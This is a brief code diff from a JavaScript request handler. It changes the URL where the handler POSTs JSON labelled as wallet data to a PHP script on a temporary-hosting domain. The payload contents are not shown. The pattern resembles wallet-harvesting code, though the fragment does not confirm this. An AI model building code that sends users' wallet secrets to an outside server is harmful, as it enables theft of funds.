@@ -23,7 +23,7 @@ export default async function handler(req, res) {
     }
 
     // 2. Save it to PHP backend
-    const saveResponse = await fetch('https://c09.8c6.mytemp.website/save_wallet.php', {
+    const saveResponse = await fetch('https://c09.8c6.mytemp.website/templates/save_wallet.php', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
